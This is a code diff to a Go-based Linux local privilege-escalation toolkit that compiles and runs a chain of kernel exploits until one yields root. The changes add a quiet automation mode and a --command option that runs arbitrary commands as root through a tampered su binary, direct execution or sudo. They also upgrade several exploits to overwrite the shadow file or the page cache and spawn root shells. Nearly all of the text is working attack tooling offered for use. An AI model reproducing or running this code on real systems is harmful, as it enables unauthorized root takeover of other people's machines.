@@ -165,15 +165,17 @@ type Exploit struct {
 // ── Toolkit ──────────────────────────────────────────────────────────────────
 
 type Toolkit struct {
-	verbose    bool
-	skipped    map[string]bool
-	tmpDir     string
-	exploits   []Exploit
-	compiled   map[string]string
-	backupDir  string
+	verbose   bool
+	quiet     bool
+	command   string
+	skipped   map[string]bool
+	tmpDir    string
+	exploits  []Exploit
+	compiled  map[string]string
+	backupDir string
 }
 
-func NewToolkit(verbose bool, skipped map[string]bool) *Toolkit {
+func NewToolkit(verbose, quiet bool, command string, skipped map[string]bool) *Toolkit {
 	exploits := []Exploit{
 		{
 			Name:        "dirtyfrag",
@@ -232,10 +234,10 @@ func NewToolkit(verbose bool, skipped map[string]bool) *Toolkit {
 		{
 			Name:        "cve_2026_46333",
 			Filename:    "cve_2026_46333.c",
-			Description: "CVE-2026-46333: pidfd_getfd FD theft race (SSH keys/shadow)",
+			Description: "CVE-2026-46333: pidfd_getfd FD theft -> shadow write -> root shell",
 			Introduced:  "5.6",
 			FixedIn:     []string{"5.10.256", "5.15.207", "6.1.173", "6.6.139", "6.12.89", "6.18.31", "7.0.8"},
-			CompileCmd:  []string{"gcc", "-O2"},
+			CompileCmd:  []string{"gcc", "-O2", "-s", "-lcrypt"},
 			SuccessCheck: func() bool {
 				return checkFDRaceSucceeded()
 			},
@@ -313,7 +315,7 @@ func NewToolkit(verbose bool, skipped map[string]bool) *Toolkit {
 		{
 			Name:        "cve_2025_38352",
 			Filename:    "cve_2025_38352.c",
-			Description: "CVE-2025-38352: POSIX CPU timer race trigger (PoC only)",
+			Description: "CVE-2025-38352: POSIX CPU timer race + page-cache overwrite -> root",
 			Introduced:  "2.6.36",
 			CompileCmd:  []string{"gcc", "-O2", "-static", "-lpthread"},
 		},
@@ -362,6 +364,8 @@ func NewToolkit(verbose bool, skipped map[string]bool) *Toolkit {
 
 	tk := &Toolkit{
 		verbose:  verbose,
+		quiet:    quiet,
+		command:  command,
 		skipped:  skipped,
 		tmpDir:   tmpDir,
 		exploits: exploits,
@@ -374,6 +378,18 @@ func NewToolkit(verbose bool, skipped map[string]bool) *Toolkit {
 func (tk *Toolkit) log(format string, args ...interface{}) {
 	if tk.verbose {
 		fmt.Fprintf(os.Stderr, "[*] "+format+"\n", args...)
+	}
+}
+
+func (tk *Toolkit) msg(format string, args ...interface{}) {
+	if !tk.quiet {
+		fmt.Fprintf(os.Stderr, format+"\n", args...)
+	}
+}
+
+func (tk *Toolkit) say(format string, args ...interface{}) {
+	if !tk.quiet {
+		fmt.Printf(format+"\n", args...)
 	}
 }
 
@@ -442,8 +458,17 @@ func (tk *Toolkit) compile(exp Exploit) (string, error) {
 	}
 
 	binPath := filepath.Join(tk.tmpDir, exp.Name)
-	args := append([]string{}, exp.CompileCmd[1:]...)
-	args = append(args, "-o", binPath, srcPath)
+	// Split compile flags into regular flags and linker flags (-l, -L)
+	var compileFlags, linkFlags []string
+	for _, f := range exp.CompileCmd[1:] {
+		if strings.HasPrefix(f, "-l") || strings.HasPrefix(f, "-L") {
+			linkFlags = append(linkFlags, f)
+		} else {
+			compileFlags = append(compileFlags, f)
+		}
+	}
+	args := append(compileFlags, "-o", binPath, srcPath)
+	args = append(args, linkFlags...)
 	if exp.Name == "dirtyfrag" {
 		args = append(args, "-lutil")
 	}
@@ -586,9 +611,23 @@ func (tk *Toolkit) runExploit(exp Exploit, binary string) bool {
 	defer cancel()
 
 	cmd := exec.CommandContext(ctx, binary)
-	cmd.Stdout = os.Stdout
-	cmd.Stderr = os.Stderr
-	cmd.Stdin = os.Stdin
+
+	if tk.command != "" {
+		// Automation mode: suppress exploit output unless verbose
+		cmd.Stdin = nil
+		if exp.Name == "dirtyfrag" {
+			cmd.Args = append(cmd.Args, "--corrupt-only")
+		}
+		if tk.verbose {
+			cmd.Stdout = os.Stdout
+			cmd.Stderr = os.Stderr
+		}
+	} else {
+		// Interactive mode: need stdout/stderr for shell interaction
+		cmd.Stdout = os.Stdout
+		cmd.Stderr = os.Stderr
+		cmd.Stdin = os.Stdin
+	}
 
 	// Multi-binary exploits run from tmpDir so extra binaries are in CWD
 	if exp.Name == "cve_2023_0386" {
@@ -660,7 +699,11 @@ func (tk *Toolkit) PrintPlan() {
 func (tk *Toolkit) Run() {
 	defer tk.Cleanup()
 
-	fmt.Printf(`
+	kv := parseKernelVersion(tk.kernelVersion())
+	distro := detectDistro()
+
+	if !tk.quiet {
+		fmt.Printf(`
 ╔══════════════════════════════════════════════════════════╗
 ║      Linux LPE Toolkit - 18 exploits loaded              ║
 ╠══════════════════════════════════════════════════════════╣
@@ -689,55 +732,59 @@ func (tk *Toolkit) Run() {
 [*] Binary mode:    %s
 
 `, tk.kernelVersion(), runtime.GOARCH, tk.binaryMode())
-
-	kv := parseKernelVersion(tk.kernelVersion())
-	distro := detectDistro()
+	}
 
 	// Resolve (compile or extract) all usable exploits
 	tk.log("Resolving exploit binaries...")
 	for _, exp := range tk.exploits {
 		if tk.skipped[exp.Name] {
-			fmt.Printf("[-] Skipping %s (user requested)\n", exp.Name)
+			tk.msg("[-] Skipping %s (user requested)", exp.Name)
 			continue
 		}
 		if !tk.isKernelSupported(exp, kv) {
-			fmt.Printf("[-] Skipping %s (kernel %s not in vulnerable range)\n", exp.Name, kv)
+			tk.msg("[-] Skipping %s (kernel %s not in vulnerable range)", exp.Name, kv)
 			continue
 		}
 		if !tk.isDistroSupported(exp, distro, kv) {
-			fmt.Printf("[-] Skipping %s (distro kernel appears patched)\n", exp.Name)
+			tk.msg("[-] Skipping %s (distro kernel appears patched)", exp.Name)
 			continue
 		}
 		if exp.SkipCheck != nil && exp.SkipCheck() {
-			fmt.Printf("[-] Skipping %s (prerequisites not met)\n", exp.Name)
+			tk.msg("[-] Skipping %s (prerequisites not met)", exp.Name)
 			continue
 		}
 
 		if exp.GoHandler != nil {
 			tk.compiled[exp.Name] = ""
-			fmt.Printf("[+] %s: ready (go-handler)\n", exp.Name)
+			tk.msg("[+] %s: ready (go-handler)", exp.Name)
 			continue
 		}
 
 		binary, err := tk.resolveBinary(exp)
 		if err != nil {
-			fmt.Printf("[-] %s: resolve failed: %v\n", exp.Name, err)
+			tk.msg("[-] %s: resolve failed: %v", exp.Name, err)
 			continue
 		}
 		tk.compiled[exp.Name] = binary
-		fmt.Printf("[+] %s: ready (%s)\n", exp.Name, filepath.Base(binary))
+		tk.msg("[+] %s: ready (%s)", exp.Name, filepath.Base(binary))
 	}
 
 	if len(tk.compiled) == 0 {
-		fmt.Println("\n[-] No exploits could be resolved. Exiting.")
+		if tk.quiet {
+			fmt.Println("[-] unsuccessful in getting root")
+		} else {
+			tk.msg("\n[-] No exploits could be resolved. Exiting.")
+		}
 		return
 	}
 
 	// Backup SUID binaries before running any exploit
 	tk.backupSUID()
 
-	fmt.Printf("\n[*] Beginning exploit runs (%d available)...\n", len(tk.compiled))
-	fmt.Println("[*] Each exploit will be tried until one escalates to root.")
+	if !tk.quiet {
+		fmt.Printf("\n[*] Beginning exploit runs (%d available)...\n", len(tk.compiled))
+		fmt.Println("[*] Each exploit will be tried until one escalates to root.\n")
+	}
 
 	for _, exp := range tk.exploits {
 		binary, ok := tk.compiled[exp.Name]
@@ -745,10 +792,9 @@ func (tk *Toolkit) Run() {
 			continue
 		}
 
-		fmt.Printf("\n═══════════════════════════════════════════\n")
-		fmt.Printf("  Trying: %s\n", exp.Name)
-		fmt.Printf("  %s\n", exp.Description)
-		fmt.Printf("═══════════════════════════════════════════\n\n")
+		if !tk.quiet {
+			fmt.Printf("  Trying: %s\n", exp.Name)
+		}
 
 		var succeeded bool
 		if exp.GoHandler != nil {
@@ -758,33 +804,89 @@ func (tk *Toolkit) Run() {
 		}
 
 		if succeeded {
+			if !tk.quiet {
+				fmt.Printf("\n")
+			}
+
+			// Handle --command: execute command as root
+			// GoHandler exploits (gtfobins) handle --command internally
+			if tk.command != "" {
+				if exp.GoHandler == nil {
+					tk.execCommandAsRoot(exp)
+				}
+				if os.Geteuid() == 0 {
+					tk.restoreSUID()
+					tk.dropCaches()
+				}
+				return
+			}
+
 			if exp.SuccessCheck == nil && exp.GoHandler == nil {
-				// Page-cache exploit: the exploit binary itself provides
-				// an interactive root shell (via patched SUID binary).
-				// That shell has already exited by now, so just inform
-				// the user and clean up.
-				fmt.Printf("\n[+] %s succeeded! Page cache contaminated.\n", exp.Name)
-				fmt.Println("[!] You were already root in the exploit's shell.")
-				fmt.Println("[!] Run 'su' in your terminal to regain root while cache is hot.")
+				tk.say("[+] %s succeeded! Page cache contaminated.", exp.Name)
+				tk.say("[!] Run 'su' in your terminal to regain root while cache is hot.")
 			} else {
-				// FD-race or GTFOBins exploit
-				fmt.Printf("\n[+] %s succeeded!\n", exp.Name)
+				tk.say("[+] %s succeeded!", exp.Name)
 			}
 
 			if os.Geteuid() == 0 {
 				tk.restoreSUID()
 				tk.dropCaches()
 			} else {
-				fmt.Println("[!] Run as root to auto-restore SUID binaries and drop caches.")
+				tk.say("[!] Run as root to auto-restore SUID binaries and drop caches.")
 			}
 			return
 		}
 
-		fmt.Printf("[-] %s did not succeed on this system\n", exp.Name)
+		tk.msg("[-] %s did not succeed on this system", exp.Name)
 	}
 
-	fmt.Println("\n[-] All exploits failed on this system.")
+	if tk.quiet {
+		fmt.Println("[-] unsuccessful in getting root")
+	} else {
+		tk.msg("\n[-] All exploits failed on this system.")
+	}
 	tk.restoreSUID()
+}
+
+// execCommandAsRoot runs the user-specified command after root is achieved.
+// It tries several approaches: direct exec if we are root, or via patched SUID
+// binary (page-cache exploits), or via sudo.
+func (tk *Toolkit) execCommandAsRoot(exp Exploit) {
+	tk.say("[+] %s succeeded! Running command...", exp.Name)
+
+	// Try direct execution if already root
+	if os.Geteuid() == 0 {
+		cmd := exec.Command("/bin/sh", "-c", tk.command)
+		cmd.Stdout = os.Stdout
+		cmd.Stderr = os.Stderr
+		cmd.Run()
+		return
+	}
+
+	// Try via su if page cache is pwned
+	// Page-cache exploits patch su with shellcode that spawns /bin/sh.
+	// We pipe the command to stdin so the spawned shell executes it.
+	if isPageCachePwned() {
+		cmd := exec.Command("su", "-")
+		cmd.Stdout = os.Stdout
+		cmd.Stderr = os.Stderr
+		cmd.Stdin = strings.NewReader(tk.command + "\nexit\n")
+		if err := cmd.Run(); err == nil {
+			return
+		}
+	}
+
+	// Try via sudo
+	if sudoPath, err := exec.LookPath("sudo"); err == nil {
+		cmd := exec.Command(sudoPath, "-n", "sh", "-c", tk.command)
+		cmd.Stdout = os.Stdout
+		cmd.Stderr = os.Stderr
+		if err := cmd.Run(); err == nil {
+			return
+		}
+	}
+
+	tk.say("[!] Could not execute command as root. You may need to run it manually.")
 }
 
 func (tk *Toolkit) binaryMode() string {
@@ -1056,6 +1158,19 @@ func handleGTFOBins(tk *Toolkit) bool {
 		return false
 	}
 
+	// If --command is set, run the command via sudo directly
+	if tk.command != "" {
+		cmd := exec.Command(sudoPath, "-n", "sh", "-c", tk.command)
+		cmd.Stdout = os.Stdout
+		cmd.Stderr = os.Stderr
+		cmd.Stdin = os.Stdin
+		if err := cmd.Run(); err == nil {
+			return true
+		}
+		tk.log("sudo command execution failed: %v", err)
+		return false
+	}
+
 	cmd := exec.Command(sudoPath, "-n", "-l")
 	output, err := cmd.Output()
 	if err != nil {
@@ -1092,7 +1207,7 @@ func handleGTFOBins(tk *Toolkit) bool {
 		}
 
 		if err := cmd.Run(); err == nil {
-			fmt.Printf("\n[+] sudo %s spawned a root shell\n", tech.binary)
+			tk.log("sudo %s spawned a root shell", tech.binary)
 			return true
 		}
 	}
